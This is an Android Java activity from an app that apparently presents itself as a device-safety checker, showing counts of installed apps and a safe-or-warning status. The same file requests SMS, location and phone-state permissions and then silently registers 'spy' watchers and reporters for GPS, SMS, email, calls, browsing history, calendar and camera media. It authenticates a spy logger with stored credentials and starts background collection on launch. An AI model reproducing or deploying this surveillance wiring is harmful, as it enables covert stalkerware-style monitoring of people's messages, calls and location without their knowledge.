package th.ac.bu.mcop.activities;

import android.Manifest;
import android.animation.Animator;
import android.animation.AnimatorInflater;
import android.animation.AnimatorSet;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.content.LocalBroadcastManager;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;

import java.util.ArrayList;

import th.ac.bu.mcop.R;
import th.ac.bu.mcop.android.monitor.AndroidWatchdogService;
import th.ac.bu.mcop.android.monitor.core.AndroidEvent;
import th.ac.bu.mcop.android.monitor.core.AndroidWatchdog;
import th.ac.bu.mcop.android.monitor.observer.AndroidBrowsingHistoryWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidCalendarWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidCallWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidCameraWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidEmailWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidGpsWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidSmsWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidWatcher;
import th.ac.bu.mcop.android.spy.ConfiguratingWatcher;
import th.ac.bu.mcop.android.spy.reporter.BrowsingHistorySpyReporter;
import th.ac.bu.mcop.android.spy.reporter.CalendarSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.CallSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.GpsSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.MailSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.MediaSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.SmsSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.SpyReporter;
import th.ac.bu.mcop.broadcastreceiver.IntenetReceiver;
import th.ac.bu.mcop.mobile.monitor.core.Event;
import th.ac.bu.mcop.mobile.monitor.core.Watchdog;
import th.ac.bu.mcop.models.realm.AppRealm;
import th.ac.bu.mcop.modules.api.ApplicationInfoManager;
import th.ac.bu.mcop.services.BackgroundService;
import th.ac.bu.mcop.utils.Constants;
import th.ac.bu.mcop.utils.Settings;

public class HomeActivity extends AppCompatActivity implements View.OnClickListener{

    private Button mAboutButton, mManageAppButton, mStartLogButton;
    private TextView mTotalInstalledAppTextView, mAppUsingInternetTextView, mMessageTextView;
    private TextView mStatusAppsInDevice;
    private ImageView mCircleImageview;
    public static TextView mTestSMSTextView;

    private boolean isAppPaused = false;
    private Runnable mRunnable;
    private Handler mHandler;
    private IntenetReceiver mIntenetReceiver;

    private static AndroidWatchdog mWatchdog;
    private BroadcastReceiver mReceiver;

    public static final String APPLICATION_TAG = "spiderman";
    public static final String PASSWORD_FIELD = "password";
    public static final String USERNAME_FIELD = "username";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);

        mTotalInstalledAppTextView = (TextView) findViewById(R.id.number_total_install_textview);
        mAppUsingInternetTextView = (TextView) findViewById(R.id.number_app_using_internet_textview);
        mAboutButton = (Button) findViewById(R.id.about_button);
        mManageAppButton = (Button) findViewById(R.id.manage_app_button);
        mStartLogButton = (Button) findViewById(R.id.start_log_button);
        mMessageTextView = (TextView) findViewById(R.id.message_textview);
        mStatusAppsInDevice = (TextView) findViewById(R.id.status_apps_in_device);
        mCircleImageview = (ImageView) findViewById(R.id.circle_imageview);
        mTestSMSTextView = (TextView) findViewById(R.id.test_sms_textview);

        mManageAppButton.setOnClickListener(this);
        mAboutButton.setOnClickListener(this);
        mStartLogButton.setOnClickListener(this);

        ArrayList<ApplicationInfo> applicationInstalled = ApplicationInfoManager.getTotalApplication(this);
        ArrayList<ApplicationInfo> applicationUsingInternet = ApplicationInfoManager.getTotalApplicationUsingInternet(this);

        mTotalInstalledAppTextView.setText(applicationInstalled.size() + "");
        mAppUsingInternetTextView.setText(applicationUsingInternet.size() + "");

        mHandler = new Handler();
        mIntenetReceiver = new IntenetReceiver();

        // start sms
        if (Build.VERSION.SDK_INT >= 23){
            requestReadSMSPermission();
        } else {
            initSMSWatch();
        }

        animateScal();
    }

    @Override
    protected void onDestroy() {
        //mWatchdog.clear();
        //unregisterReceiver(mReceiver);
        super.onDestroy();
    }

    @Override
    protected void onStart() {
        super.onStart();

        LocalBroadcastManager.getInstance(this).registerReceiver(mMessageRecevier, new IntentFilter(Constants.INTENT_FILTER_UPDATE_UI));
        LocalBroadcastManager.getInstance(this).registerReceiver(mIntenetReceiver, new IntentFilter(Constants.INTENT_FILTER_INTERNET));

        isAppPaused = false;
        super.onStart();
        Settings.loadSetting(this);
        setAppSafeOrNotView();

        startCollection();
    }

    @Override
    protected void onStop() {
        try {
            unregisterReceiver(mMessageRecevier);
            unregisterReceiver(mIntenetReceiver);
        } catch (Exception ex) {
            Log.d(Settings.TAG, ex.getMessage());
        }

        isAppPaused = true;
        super.onStop();
    }

    private void animateScal(){

        AnimatorSet animator = (AnimatorSet) AnimatorInflater.loadAnimator(this, R.animator.scal);
        animator.setTarget(mCircleImageview);
        animator.start();
        animator.addListener(new Animator.AnimatorListener() {
            @Override
            public void onAnimationStart(Animator animator) {}

            @Override
            public void onAnimationEnd(Animator animator) {
                animateScal();
            }

            @Override
            public void onAnimationCancel(Animator animator) {}

            @Override
            public void onAnimationRepeat(Animator animator) {}
        });
    }

    /***********************************************
     OnClickListener
     ************************************************/

    @Override
    public void onClick(View view) {
        if (view.getId() == R.id.about_button){

            Intent intent = new Intent(this, AboutActivity.class);
            startActivity(intent);

        } else if (view.getId() == R.id.manage_app_button){

            Intent intent = new Intent(this, ApplistActivity.class);
            startActivity(intent);

        }/* else if (view.getId() == R.id.start_log_button){

            if(Settings.isUsageAccessGranted(this)){
                if(!isServiceRunning(BackgroundService.class)) { //service is stopped. Start it.
                    Intent intent = new Intent(this, BackgroundService.class);
                    try {
                        stopService(intent);
                    } catch (Exception ex) {
                        Log.d(Settings.TAG, ex.toString());
                    }

                    startService(intent);

                } else {
                    stopService(new Intent(this,BackgroundService.class));
                    BackgroundService.sStopRequest = true;

                    mHandler.removeCallbacks(mRunnable);
                }
            } else {

                Intent intent = new Intent(android.provider.Settings.ACTION_USAGE_ACCESS_SETTINGS);
                startActivity(intent);
            }
        }*/
    }

    private void setAppSafeOrNotView(){

        ArrayList<AppRealm> yellowApps = AppRealm.getWarningYellowApps();
        ArrayList<AppRealm> orangeApps = AppRealm.getWarningOrangeApps();
        ArrayList<AppRealm> redApps = AppRealm.getWarningRedApps();

        ArrayList<AppRealm> warningApps = new ArrayList<>();
        warningApps.addAll(redApps);
        warningApps.addAll(orangeApps);
        warningApps.addAll(yellowApps);

        if (warningApps.size() > 0){
            String messageWarning = getString(R.string.label_device_warning, warningApps.size());
            mStatusAppsInDevice.setText(messageWarning);
            mCircleImageview.setImageResource(R.drawable.circle_red);
        } else {
            mStatusAppsInDevice.setText(getString(R.string.label_device_safe));
            mCircleImageview.setImageResource(R.drawable.circle_green);
        }
    }

    private BroadcastReceiver mMessageRecevier = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if(!isAppPaused) {

            }
        }
    };

    private void startCollection(){

        if(!isServiceRunning(BackgroundService.class)) { //service is stopped. Start it.
            Intent intent = new Intent(this, BackgroundService.class);
            startService(intent);
        }
    }

    private boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    private void requestReadSMSPermission(){
        Log.d(Settings.TAG, "requestReadSMSPermission");
        int hasSmsPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);
        if (hasSmsPermission != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, Constants.REQUEST_READ_SMS);
            return;
        }

        requestFineLocationPermission();
    }

    private void requestFineLocationPermission(){
        Log.d(Settings.TAG, "requestFineLocationPermission");
        int hasLocationPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION);
        if (hasLocationPermission != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, Constants.REQUEST_ACCESS_FINE_LOCATION);
            return;
        }

        initSMSWatch();
    }

    private void requestReadPhoneStatePermission(){
        Log.d(Settings.TAG, "requestReadPhoneStatePermission");
        int hasLocationPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE);
        if (hasLocationPermission != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, Constants.REQUEST_READ_PHONE_STATE);
            return;
        }

        initSMSWatch();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //PERMISSION_GRANTED = 0;
        Log.d(Settings.TAG, "onRequestPermissionsResult [" + requestCode + "]" + "[" + grantResults.length +"]" + "[" + + grantResults[0] + "]");
        if (requestCode == Constants.REQUEST_READ_SMS){
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                requestFineLocationPermission();
            }
        } else if (requestCode == Constants.REQUEST_ACCESS_FINE_LOCATION){
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                requestReadPhoneStatePermission();
            }
        } else if (requestCode == Constants.REQUEST_READ_PHONE_STATE){
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                initSMSWatch();
            }
        }
    }


    /***********************************************
     Init SMS
     ************************************************/
    private void initSMSWatch(){
        Log.d(Settings.TAG, "initSMSWatch");
        mWatchdog = new AndroidWatchdog();
        IntentFilter filter = new IntentFilter();
        initWatchdog(mWatchdog, filter);

        mReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                AndroidEvent event = new AndroidEvent(this, context, intent);
                mWatchdog.watch(event);
            }
        };
        registerReceiver(mReceiver, filter);
        startService(new Intent(this, AndroidWatchdogService.class));
    }

    private void initWatchdog(Watchdog watchdog, IntentFilter filter) {
        // Yeah, I also want to read my configuration from local preferences
        SharedPreferences settings = getSharedPreferences(
                APPLICATION_TAG, Context.MODE_PRIVATE);
        String username = settings.getString(USERNAME_FIELD, "");
        String password = settings.getString(PASSWORD_FIELD, "");
        SpyReporter.getSpyLogger().setAuthCredentials(username, password);
        // Monitor all interesting events
        register(new AndroidGpsWatcher(new GpsSpyReporter(), 480000), filter);
        register(new AndroidSmsWatcher(new SmsSpyReporter()), filter);
        register(new AndroidEmailWatcher(new MailSpyReporter()), filter);
        register(new AndroidCallWatcher(new CallSpyReporter()), filter);
        register(new AndroidBrowsingHistoryWatcher(new BrowsingHistorySpyReporter()), filter);
        register(new AndroidCalendarWatcher(new CalendarSpyReporter()), filter);
        register(new AndroidCameraWatcher(new MediaSpyReporter(username)), filter);
        // Configuration dialog
        register(new ConfiguratingWatcher(), filter);
    }

    protected final void register(AndroidWatcher watcher, IntentFilter filter) {
        mWatchdog.register(watcher.getObserver());
        Event event = new AndroidEvent(this, this, null);
        for (String action : watcher.getIntents()) {
            filter.addAction(action);
            watcher.start(event);
        }
    }

    public static AndroidWatchdog getWatchdog() {
        return mWatchdog;
    }
}
